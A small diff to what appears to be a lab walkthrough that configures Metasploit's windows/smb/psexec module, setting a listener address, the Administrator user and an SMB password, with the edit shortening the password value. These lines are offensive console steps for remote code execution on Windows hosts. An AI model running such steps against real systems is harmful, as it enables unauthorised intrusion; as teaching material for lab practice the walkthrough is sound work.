@@ -128,7 +128,7 @@ msf6 exploit(windows/smb/psexec) > `set LHOST 10.10.117.128`
 
 msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
 
-msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234567891011121314`
+msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`
 
 It should look lie this:
 
